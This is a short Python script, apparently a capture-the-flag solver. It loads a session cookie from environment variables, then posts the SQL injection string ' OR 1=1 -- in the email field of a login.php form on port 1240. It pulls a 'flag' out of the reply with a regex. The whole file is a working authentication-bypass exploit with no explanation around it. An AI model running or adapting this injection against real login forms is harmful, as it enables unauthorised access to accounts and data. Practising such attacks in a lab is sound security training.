import os
import re

import requests
from dotenv import load_dotenv

load_dotenv()

from yachalk import chalk

DOMAIN = os.environ.get("DOMAIN")
URL = f"http://{DOMAIN}:1240"
TARGET = f"{URL}/login.php?"
SQL_INJECTION = "' OR 1=1 -- "

session = requests.Session()


def setup_session():
    session.cookies.set(
        name=os.environ.get("COOKIE_NAME"),
        value=os.environ.get("COOKIE_VALUE"),
        domain=DOMAIN,
    )
    print(chalk.bold("Cookies\t"), chalk.black(session.cookies.get_dict()))


def get_flag():
    payload = {
        "email": SQL_INJECTION,
        "password": "password",
    }

    post_request = session.post(TARGET, data=payload)
    return re.search("flag.*", post_request.text).group(0)


if __name__ == "__main__":
    setup_session()

    flag = get_flag()
    print(chalk.bold("Flag\t"), chalk.green(flag))
